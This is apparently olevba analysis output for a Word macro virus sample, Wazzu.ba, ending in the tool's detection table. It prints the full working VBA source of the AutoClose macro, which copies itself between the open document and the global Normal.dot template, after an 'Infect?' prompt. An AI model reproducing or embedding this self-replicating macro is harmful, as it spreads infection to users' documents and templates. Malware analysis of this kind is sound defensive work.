olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Wazzu.ba
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Wazzu.ba - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Wazzu.ba - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Answer
Dim Where$
On Error GoTo -1: On Error GoTo Abort

Answer = WordBasic.MsgBox("Infect?", 36)
    
If Answer = -1 Then

Where$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If Where$ = "NORMAL.DOT" Then
        WordBasic.MacroCopy "Global:autoClose", WordBasic.[FileName$]() + ":AutoClose"
        WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
    Else
        WordBasic.MacroCopy WordBasic.[FileName$]() + ":autoClose", "Global:AutoClose"
        WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
    End If

End If

Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

